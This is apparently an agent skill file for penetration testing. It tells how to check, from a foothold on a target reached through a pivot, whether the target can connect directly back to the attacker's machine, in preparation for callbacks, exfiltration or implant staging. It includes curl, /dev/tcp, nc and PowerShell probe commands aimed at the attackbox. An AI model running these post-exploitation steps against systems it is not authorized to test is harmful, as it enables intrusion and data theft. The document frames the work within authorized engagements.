---
name: connectivity-probe
description: >
  Before engineering tunneled file delivery or callbacks for a target
  reached through a pivot, PROBE whether that target can actually reach
  the attackbox directly. A→B→C tunneling (A reaches C through B) does
  NOT imply the reverse — C may reach A on its own via a shared VLAN,
  internet egress, a different interface, or a route the pivot didn't
  obscure. This skill runs a minimal reachability test from C back to A
  on each candidate protocol/port and reports which transports are
  actually available before anyone over-engineers the egress.
keywords:
  - connectivity test
  - reachability
  - reverse reachability
  - callback test
  - pivot egress
  - tunnel assumption
  - A B C
  - port scan reverse
  - callback feasibility
tools:
  - Bash
  - mcp__shell-server__start_listener
  - mcp__shell-server__list_sessions
  - mcp__shell-server__send_command
  - mcp__metasploit-server__execute
  - mcp__nmap-server__nmap_scan
opsec: medium
---

# Connectivity probe (reverse reachability from target to attackbox)

When we reach a target through a pivot (A→B→C — attackbox→jump→target),
the natural assumption is that any callback or file fetch FROM C must
also traverse the pivot. That assumption is often wrong and leads to
hours of unnecessary engineering (reverse port forwards, in-pivot HTTP
servers, chained tunnels, uploads via the pivot's RPC). **Test first.**
C may have its own path back to A: internet egress, a flat lab subnet,
a second NIC the pivot didn't expose, a corporate L3 that routes
RFC1918 between zones.

Load this skill the moment you need C to pull a file or send a callback
and A→B→C was the only path you've seen so far. The test takes under a
minute and either saves an afternoon or confirms the complication is
real.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[connectivity-probe] <target> → <attackbox>:<ports>` on activation.
- Save the result (which transports work, which don't) to
  `engagement/evidence/connectivity-<target>-<ts>.txt`. This matters —
  a later teammate loading a different skill will want to know the
  verdict without re-probing.

## Scope Boundary

This skill ONLY tests reachability from an existing foothold on C back
to A. It does NOT:
- Set up the actual callback / file server (that's whichever skill
  needs the egress — reverse-shell / exfil / implant-staging).
- Build the pivot or tunnel (that's `pivoting-tunneling`).
- Scan C's inbound surface from A (that's reconnaissance; `nmap`).

Return with: the list of transports that reached A, which were blocked,
and the recommendation (direct from C, or must tunnel back).

## State Management

Nothing to write to state.db directly. Save the evidence file; the
calling teammate decides whether a `[add-vuln]` for exposed egress
belongs in state (usually not — unrestricted egress is a config
observation, not a vuln on this host unless the engagement explicitly
tests egress policy).

## Prerequisites

- A working foothold on C (shell-server session, MSF session, or
  interactive process you can run commands in).
- `A` = the attackbox's reachable IP from C's perspective. If A is
  behind NAT itself (home lab), use the public IP / router mapping.
- At least one shell-server listener on A you can throw up briefly,
  OR nc/ncat on A to listen one-shot.
- `curl` or `wget` or a scripting runtime on C for HTTP tests. Most
  modern targets have at least one.

## Steps

### 1. Pick the probe set

Default probes, run them all unless the engagement bans something:

| Transport | Why | Port on A |
|---|---|---|
| HTTPS (443) | Most firewalls allow outbound 443 for anything | 443 |
| HTTP (80) | Second-most-allowed outbound; also sanity check | 80 |
| DNS/UDP (53) | Allowed almost universally; useful for exfil-only paths | 53 |
| High TCP (e.g. 4444, 8443) | What our handlers actually use | 4444 and the real callback port |
| ICMP echo | Dirt-cheap sanity test; often disabled across L3 | — |

If the engagement bans unusual egress tests, trim to the transports
your actual callback needs plus one baseline (HTTPS/443).

### 2. Pick A's observable IP

C's view of A is NOT always A's own routing table.
- Direct lab / flat network → A's primary IP works.
- A is behind NAT → use A's public IP (or the port-forwarded router IP).
- A has multiple NICs → the one on the same L3 as C, if any.

If you don't know, start with A's primary IP. The probes failing is
also information — it tells you tunnel-back is actually needed.

### 3. Set up the receivers on A

For TCP probes, a short-lived listener per port:

```
# On A (via shell-server MCP): one listener for each port you want to test.
mcp__shell-server__start_listener(port=443, label="probe-443")
mcp__shell-server__start_listener(port=80, label="probe-80")
mcp__shell-server__start_listener(port=4444, label="probe-4444")
```

(If port 443/80 is already owned by something on A — a running Apache,
caddy — skip that port in the shell-server dance and point curl's probe
at the HTTP service that IS running on A. A `200`/`401`/`403` response
is still proof C reached A on 443/80.)

For UDP/53 / ICMP: use `tcpdump` on A to see arrivals, since
shell-server is TCP-only.

```
# On A (operator terminal, not shell-server):
sudo timeout 30 tcpdump -ni any 'udp port 53 or icmp' -w /tmp/probe.pcap &
```

### 4. Fire the probes from C

Run **in the C session** (via `send_command` on shell-server, or
`execute` on metasploit). Use short, generous timeouts; a hung probe
is itself a result ("timed out = blocked or routing-black-hole").

Linux target:
```
A=<attackbox-ip>
for p in 80 443 4444; do
    out=$(curl -s --connect-timeout 5 -o /dev/null -w "%{http_code} %{time_connect}" "http://$A:$p/__probe" 2>&1)
    echo "tcp/$p -> $out"
done
# Raw TCP (no HTTP) — useful if the receiver on A is a bare shell-server listener:
for p in 4444 8443; do
    (echo "probe-$p" >/dev/tcp/$A/$p) 2>&1 | head -1 && echo "tcp/$p -> open" || echo "tcp/$p -> blocked"
done
# UDP/53:
echo -n "probe" | timeout 3 nc -u -w1 $A 53 && echo "udp/53 -> sent (check pcap on A)"
# ICMP:
ping -c 2 -W 2 $A && echo "icmp -> ok" || echo "icmp -> blocked"
# DNS resolution of our hostname (if we have one): tests outbound DNS fully
nslookup $(hostname -f).your-attackbox-dns.tld 2>&1 | tail -3
```

Windows target (cmd/powershell):
```
# PowerShell is the easiest; cmd+nslookup is the fallback.
powershell -nop -c "foreach ($p in 80,443,4444) { try { $t=[System.Net.Sockets.TcpClient]::new(); $iar=$t.BeginConnect('<A>',$p,$null,$null); if ($iar.AsyncWaitHandle.WaitOne(3000,$false)) { Write-Host \"tcp/$p -> open\" } else { Write-Host \"tcp/$p -> timeout\" }; $t.Close() } catch { Write-Host \"tcp/$p -> err: $_\" } }"
powershell -nop -c "Test-Connection -ComputerName <A> -Count 2 -Quiet"
```

### 5. Verify on A

For each probe, confirm on A:
- shell-server listener for that port shows a connection (even an
  empty/malformed one — the TCP handshake landed).
  `mcp__shell-server__list_sessions` → look for a new session with
  the probe label.
- `tcpdump` on A captured the UDP/53 or ICMP packet.
- The HTTP service's access log recorded the request.

**Important:** C's side saying "open" when A heard nothing means a
transparent proxy / middlebox swallowed the probe and faked a 200.
Only count a transport as reachable when BOTH ends agree.

### 6. Tear down the probes

Close every listener you opened for the probe. Leaving them up pollutes
subsequent `list_sessions` output and wastes ports.

```
mcp__shell-server__close_listener(label="probe-443")
# etc. for each probe label
```

Kill the tcpdump:
```
sudo pkill -f 'tcpdump.*probe.pcap'
```

### 7. Report

Record in `engagement/evidence/connectivity-<target>-<ts>.txt`:
- Each transport tested, each verdict (reachable/blocked/ambiguous)
- The A IP C actually reached (its primary IP, public IP, or a route
  you didn't expect — this often tells you about C's L3 position)
- Recommendation:
  - "**Direct from C** works for tcp/443 — use HTTPS callback / `curl`
    file pull straight to A." → the common fast path.
  - "**Must tunnel back** — every direct probe blocked. Set up reverse
    port-forward via the pivot (see `pivoting-tunneling`)." → the
    original assumption was right, but now you *know*.
  - "Mixed — tcp/443 OK, tcp/4444 blocked. Move the handler to 443 /
    use a port the egress policy allows." → common on hardened egress.

## Troubleshooting

### Every probe says "timeout" and A received nothing

Egress is firewalled or NAT'd without a return path. Tunnel-back
confirmed necessary; move on to `pivoting-tunneling`.

### Probe says "open" but A's listener saw nothing

Transparent proxy or L4 scrubber in path. The TCP handshake was
intercepted; data would never reach you. Treat as unreachable for
anything beyond trivial pings.

### Probe says 200/open but it's a captive portal

The response body on C will look like an HTML login page / corporate
proxy page, not what your receiver sent. Pipe curl output through
`head -c 200` and sanity-check. Corporate proxy = reachable in theory
but any binary payload gets corrupted/blocked; prefer tunnel-back.

### DNS/53 "sent" but no pcap arrival on A

Internal recursive resolver answered without forwarding externally.
C has DNS but not EGRESS DNS to A — not useful for an exfil channel to
A specifically. Try the organization's upstream resolver or a public
one as a sanity check for ANY egress.

### C has multiple NICs; which does the probe egress via?

Run `ip route get <A>` (Linux) / `Find-NetRoute -RemoteIPAddress <A>`
(Windows PowerShell) first to see which interface and gateway C picks.
If it's the pivot's segment, the probe is going back through B anyway
(not interesting; add a route or source-select to force a different
interface before trusting the result).

### A's own firewall drops the probe

Don't forget this one. If `iptables -L` / Windows Firewall on A
rejects the probe port, you'll see "blocked" from C with nothing on
A — looks identical to real egress blocking. Open the port on A
before testing (shell-server listeners don't automatically poke
holes).

## When NOT to use this skill

- You already have confirmed direct reachability (e.g. the vuln you
  exploited WAS a direct inbound HTTP from C to A; C can obviously
  reach A on whatever port). Skip; use direct.
- The engagement scope forbids outbound probing from targets (rare,
  but some red-team rules of engagement block "testing" egress).
  Document the assumption and tunnel back by default.
- The target is single-shot (one RCE, no stable foothold). The probe
  burns the shot; just pick the most-likely transport (HTTPS/443) and
  tunnel back as fallback.
